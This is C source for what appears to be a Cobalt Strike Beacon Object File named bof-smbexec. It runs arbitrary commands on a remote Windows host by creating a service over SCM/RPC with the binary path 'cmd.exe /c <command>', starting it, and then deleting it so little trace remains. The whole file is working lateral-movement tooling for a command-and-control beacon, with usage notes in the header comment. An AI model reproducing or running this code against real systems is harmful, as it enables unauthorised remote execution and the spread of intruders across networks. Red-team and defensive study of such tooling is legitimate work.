/*
 * bof-smbexec <host> <command> [service]
 *
 * Remote command execution by creating (and immediately removing) a service
 * on the target over SCM/RPC.  No binary is dropped: the service binary path
 * is `cmd.exe /c <command>`.
 *
 * Requirements: admin rights on the target (SC_MANAGER_CREATE_SERVICE) and
 * SMB/RPC reachable.  Output of <command> is not captured; redirect it to a
 * file yourself (for example `cmd /c whoami > C:\Windows\Temp\out.txt`).
 * The service is deleted right after the start attempt.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *host, *command, *service = "bofsmbexec";
    int hlen, clen, slen;
    char remote[MAX_PATH], binpath[1024];
    SC_HANDLE scm, svc;
    SERVICE_STATUS st;

    BeaconDataParse(&parser, args, alen);
    host    = BeaconDataExtract(&parser, &hlen);
    command = BeaconDataExtract(&parser, &clen);
    service = BeaconDataExtract(&parser, &slen);
    if (!host || !host[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: smbexec <host> <command> [service-name]\n");
        return;
    }
    if (!service || !service[0]) service = "bofsmbexec";

    remote[0] = 0;
    bof_strncpy(remote, "\\\\", sizeof(remote));
    bof_strncat(remote, host, sizeof(remote) - bof_strlen(remote) - 1);

    scm = ADVAPI32$OpenSCManagerA(remote, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManager(%s) failed: %lu\n",
                     remote, (unsigned long)KERNEL32$GetLastError());
        return;
    }

    bof_strncpy(binpath, "cmd.exe /c ", sizeof(binpath));
    bof_strncat(binpath, command, sizeof(binpath) - bof_strlen(binpath) - 1);
    if (bof_strlen(binpath) > 500) {
        BeaconPrintf(CALLBACK_ERROR, "command too long\n");
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }

    svc = ADVAPI32$CreateServiceA(scm, service, service, SERVICE_ALL_ACCESS,
                                  SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                                  SERVICE_ERROR_IGNORE, binpath,
                                  NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        BeaconPrintf(CALLBACK_ERROR, "CreateService failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] service '%s' created on %s\n  %s\n",
                 service, host, binpath);

    bof_memzero(&st, sizeof(st));
    if (ADVAPI32$StartServiceA(svc, 0, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] service started\n");
    } else {
        DWORD err = KERNEL32$GetLastError();
        /* ERROR_SERVICE_ALREADY_RUNNING is fine: config change takes effect
           the next time the service starts. */
        BeaconPrintf(CALLBACK_OUTPUT, "[*] StartService: %lu%s\n", (unsigned long)err,
                     err == ERROR_SERVICE_ALREADY_RUNNING ? " (already running)" : "");
    }

    if (ADVAPI32$DeleteService(svc))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] service deleted\n");
    else
        BeaconPrintf(CALLBACK_ERROR, "[-] DeleteService failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());

    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
}
